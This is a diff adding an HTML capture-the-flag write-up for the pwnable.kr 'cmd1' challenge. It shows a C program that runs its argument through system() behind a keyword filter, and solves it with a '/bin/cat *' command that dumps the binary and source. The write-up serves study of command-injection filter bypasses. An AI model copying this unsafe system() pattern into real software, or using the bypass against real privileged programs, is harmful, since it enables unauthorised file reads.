@@ -1,0 +1,90 @@
+<head>
+    <title>pwnable.kr - cmd1 writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's look at the source code:
+
+    <code style="display: block; white-space: pre-wrap;">
+        #include &lt;stdio.h&gt;
+        #include &lt;string.h&gt;
+
+        int filter(char* cmd){
+        int r=0;
+        r += strstr(cmd, "flag")!=0;
+        r += strstr(cmd, "sh")!=0;
+        r += strstr(cmd, "tmp")!=0;
+        return r;
+        }
+        int main(int argc, char* argv[], char** envp){
+        putenv("PATH=/thankyouverymuch");
+        if(filter(argv[1])) return 0;
+        system( argv[1] );
+        return 0;
+        }
+    </code>
+
+    So we have a filter on our inputs. We can't enter the words flag, sh and tmp. At the start of the program, we initialize the path to /thankyouverymuch. We can solve this by CATing all the files in the dir:
+
+    <code style="display: block; white-space: pre-wrap;">
+        cmd1@pwnable:~$ ./cmd1 /bin/cat *
+a
+a
+a
+a
+^Ccmd1@pwnable:~$ ./cmd1 "/bin/cat *"
+ELF&gt;�@@X@8	@@@@@�88@8@@@ ((`( PP`P`�TT@T@DDP�td��@�@44Q�tR�td((`(`��/lib64/ld-linux-x86-64.so.2GNUGNU�{#'�(�/B�-��xl�
+                                                                                                                          n(/! �__gmon_start__libc.so.6strstrputenvsystem__libc_start_mainGLIBC_2.2.5u�i	A�````H���"�H���5�
+              �%�
+                  @�%�
+                       h������%�
+                                 h������%z
+                                           h������%r
+                                                     h����1�I��^H��H���PTI��@H��p@H��@�������H�H��
+ H��t��H�Ð������������UH��SH��= 
+                                 uK�@`H��
+                                          H��8`H��H��H9�s$fDH��H��
+ ��8`H��
+ H9�r���
+ H�[]�fff.�H�= UH��t�H��]�H`��]Ð�UH��H�� H�}��E�H�E�\@H�������H������E�H�E�a@H�������H������E�H�E�d@H������H������E��E���UH��H�� �}�H�u�H�U�h@��k���H�E�H�H�H���\�����t��H�E�H�H�H�Ǹ������Ð�������������H�l$�L�d$�H�-� L�%� L�l$�L�t$�L�|$�H�\$�H��8L)�A��I��H��I������H��t1�@L��L��D��A��H��H9�u�H�\H�l$L�d$L�l$ L�t$(L�|$0H��8���Ð�������������UH��SH�H H���t�(`DH���H�H���u�H�[]Ð�H�����H��flagshtmpPATH=/fuckyouverymuch4����P���x���������������zRx
+             $����PFJ
+j                    �?�;*3$"D����oA�C
+Z����_A�C
+$�0����Q��_@�������������������������
+H@���o�@H@�@                         @@
+M
+ �``�@�@���o�@���o���o�@P`v@�@�@�@GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.text@8#T@T 1t@t$D���o�@Ne_hdr.eh_frame.ctors.dtors.jcr.dynamic.got.got.plt.data.bss.comment
+                    �@�VH@HM^���o�@�
+                                    k���o�@�z�@��@�`
+                                                   �@@@�`@`P��@���H@H�X@X&��@�4��@��(`�8`�H�P`P���`� `0`�00*Z��H.        !8@T@t@�@�@H@��@	�@
+�@
+  @@
+@����$`�P`�$`��`P`�`�` `0`�
+@_� �0`�� `� �(`�X@�
+call_gmon_startcrtstuff.c__CTOR_LIST____DTOR_LIST____JCR_LIST____do_global_dtors_auxcompleted.6531dtor_idx.6533frame_dummy__CTOR_END____FRAME_END____JCR_END____do_global_ctors_auxcmd1.c__init_array_end_DYNAMIC__init_array_start_GLOBAL_OFFSET_TABLE___libc_csu_finidata_start_edata_finisystem@@GLIBC_2.2.5filter__DTOR_END____libc_start_main@@GLIBC_2.2.5putenv@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init_end_start__bss_startmain_Jv_RegisterClasses_initstrstr@@GLIBC_2.2.5#include <stdio.h>
+#include &lt;string.h&gt;
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/thankyouverymuch");
+	if(filter(argv[1])) return 0;
+	system( argv[1] );
+	return 0;
+}
+    
+    ********************************
+    </code>
+
+    Okay great we got it!
+
+    EOF
+    </p>
+</body>
+
